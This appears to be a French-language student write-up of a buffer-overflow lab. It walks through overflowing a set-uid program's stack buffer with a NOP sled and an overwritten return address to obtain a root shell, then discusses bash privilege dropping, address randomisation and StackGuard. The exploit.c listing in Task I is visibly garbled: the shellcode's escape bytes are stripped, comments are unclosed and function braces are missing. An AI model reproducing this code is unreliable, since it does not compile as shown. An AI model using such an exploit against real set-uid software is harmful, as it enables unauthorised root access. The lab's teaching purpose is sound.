# demo-buffer-overflow

Le programe stack.c contient une vulnéarbilité exploitable par injection dans le buffer, qui est assez grand 517 octets. Afin de gagner les privilèges root, il sera executé comme set-uid et le buffer contiendra le shellcode necessaire.

Note: Cela à été fait sur une platforme i486 gnu/linux.

# Task I 

-fno-stack-protector va désactiver la stack smashing protection mechanism de gcc, sur le programe stack.

j'ai modifié le badfile pour y inserer 517 caractère "0x90", code hexa de l'instruction NOP, qui s'avèrera très utile. L'execution de stack renvoi un segmentation fault. l'analyse du bug avec gdb retourne: program terminated with signal 11, Segmentation Fault.. l'explication est aussi donnée: address 0x90909090 is unreacheable.

info registers sur la console gdb, retourne que eip l'instruction pointer est a 0x90909090. Le programe a été hacker, et son flux détourné en ecrasant l'addresse de retour de la fonction bof().

L'idée est de mettre le shellcode quelque part en memoire, à la fin du call stack, est d'utilisé l'addresse de retour, qu'il faut bien determiner, pour y pointer sur un des NOP, le programme va glisser le long de tous ces NOP jusqu'à atteindre le shellcode. 

Avec un des privilège root sur le programme stack de type set-uid, notre payload de shellcode nous donnera un accés root sur la machine.

strcopy() étant à l'origine de la plupart des attacks par bof, la tendance des développeurs est de l'éviter. Des overflow peuvent aussi aparaitre dans les boucles mal indexé.

Le programe exploit.c généré est:


char shellcode[]= 
"310"             /* xorl    
"50"                 /* pushl   
"68""//sh"           /* pushl   0x6e69622f            */ 
"893"             /* movl    
"50"                 /* pushl   
"53"                 /* pushl   
"901"             /* movl    
"99"                 /* cdql                           */ 
"00b"             /* movb    0x80                  */ 
; 
 
void main(int argc, char **argv) 
        
        char buffer[517]; 
        FILE *badfile; 
 
        /* Initialize buffer with 0x90 (NOP instruction) */ 
        memset(&buffer, 0x90, 517); 
         
        /* we need to over write the return address by our own one, this will do it. The address was chosen after incrementing (randomly) the str variable address of the bof() function.. */ 
        long addr = 0xbffff353; 
        long *ptr = (long *) (buffer + 24); 
        *ptr = addr; 
         
        /* we put the shellcode at the end of the buffer, so pointing randomly before it would execute it, this technique is called nop-sled, there is plenty of others */ 
        memcpy(&buffer[517-strlen(shellcode)], shellcode, strlen(shellcode)); 
         
        /* Save the contents to the file "badfile" */ 
 	badfile = fopen("./badfile", "w"); 
        fwrite(buffer, 517, 1, badfile); 
        fclose(badfile); 

L'execution de stack retourne alors ce qu'on voit sur la figure . l'userid effective est bien root.

J'ai determiner l'addresse de retour en choisissant au hazard une addresse un peu plus loin que str (info args), qu'on determine avec le debugger. en effet en executant pas à pas le programme, et en visualisant les variables, on récupère &str=0xbffff317.

Avec l'instruction memcpy(&buffer[517-strlen(shellcode)], shellcode, 
strlen(shellcode)); on met le shellcode à la fin du badfile, après tous les nop.

buffer + 24 après quelques essais, en remplissant la mémoire peut à peu de façon dichotomique, et en réservant 4 octets à l'adresse.

on retrouve l'addresse de retour de call bof dans la sortie du programe objdump -d: 8048494, visualisé le stack nous permet de retrouver cette addresse, [figure].. on essaye de l'ecraser avec le badfile, en donnant une addresse plus utile...

On examine la mémoire et on trouve bien notre addresse de retour..

On utilise la commande d'exploration pour voir le contenue du stack.. tout y est, même l'addresse du shell, qu'il suffira de copier après dans l'exploit pour rediriger le programme vers elle.

# Task II 

Yes we still got a shell as a root user.. c'est pas normal, bash possède un mechnisme de sécurité, qui lâche les privilèges setuid, quand ils sont possédé par un root. En effet il fallait recompilé exploit :)

On obtient un shell non root.
    
Using /bin/sh as bourne again shell    

Pour obtenir un shell root, dans ce cas, on pourait modifier le shellcode; on y inserant l'equivalent en optcode de l'instruction setuid(0). On peut utilisé metasploit pour générer ce code.

# Task III 

La randomisation de l'addresse tend à rendre la tâche du hackeur plus difficile, mais pas impossible. Elle applique des algorithmes qui range de façon aléatoires, dans la mémoire, les données clef d'un programme, notemment le call stack.. Ce qui augmente l'espace memoire sur lequelle l'attaquant aura à deviner.

On effet en modifiant le programe pour qu'il affiche l'addresse du buffer à chaque execution on obtient des résultats tous à fait aléatoire.

Randamized memory allocation
    
Faire tourner une ou plusieurs fois ne m'a pas servit à grand chose..

# Task IV 

J'ai eu un segmentation fault..

definition interessante: "StackGuard is a simple compiler technique that
virtually eliminates buffer overflow vulnerabilities with only modest
performance penalties." 

Ce que ça fait c'est qu'elle place lors de l'execution, un mot dans chauque instruction de retour, choisi au hazard à l'execution à partir du fichier /dev/urandom s'il existe.. ou avec un hash sur le timestamp..
ceci va arreter l'execution si la valeur de retour d'une fonction à été ecraser. Cela rend plus difficile l'attack, plusieurs solutions néamoins existe, notemment essayeé d'ecraser d'autres pointeurs que l'adresse de retour..
